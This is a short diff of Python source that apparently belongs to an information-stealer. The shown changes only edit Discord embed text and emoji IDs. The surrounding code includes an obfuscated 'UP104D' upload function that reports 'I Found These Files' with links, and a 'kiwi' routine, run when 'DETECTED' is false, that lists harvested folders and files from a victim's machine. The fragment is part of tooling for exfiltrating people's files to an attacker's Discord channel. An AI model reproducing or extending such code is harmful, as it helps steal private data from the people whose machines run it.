@@ -788,7 +788,7 @@ def UP104D(name, link):
                 "color": color,
                 "fields": [
                     {
-                    "name": "I Found This Files;:",
+                    "name": "I Found These Files",
                     "value": link
                     }
                 ],
@@ -1305,12 +1305,12 @@ if not DETECTED:
         if len(arg[2]) != 0:
             foldpath = arg[1]
             foldlist = arg[2]       
-            filetext += f" <:openfolderblackandwhitevariant:1042409305254670356> {foldpath}\n"
+            filetext += f"<:openfolder:1111408286332375040> {foldpath}\n"
 
             for ffil in foldlist:
                 a = ffil[0].split("/")
                 fileanme = a[len(a)-1]
                 b = ffil[1]
-                filetext += f"└─<:open_file_folder: [{fileanme}]({b})\n"
+                filetext += f"└─<:openfolder:1111408286332375040> [{fileanme}]({b})\n"
             filetext += "\n"
     UP104D("kiwi", filetext)
